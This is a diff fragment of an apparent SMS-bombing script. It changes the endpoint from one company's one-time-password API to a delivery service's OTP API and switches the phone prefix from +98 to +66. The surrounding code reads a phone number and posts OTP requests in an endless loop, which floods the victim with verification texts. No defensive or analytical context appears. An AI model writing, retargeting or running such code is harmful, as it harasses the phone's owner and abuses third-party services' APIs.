@@ -23,8 +23,8 @@ try:
     if NumberPhone == "" :
         print("\n[!] Please Enter Phone Number")
     else :
-        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
-        data = {"cellphone":"+98" + NumberPhone}
+        url = "https://api.1112delivery.com/api/v1/otp/create"
+        data = {"cellphone":"+66" + NumberPhone}
 
     while True:
         requests.post(url,data=data)
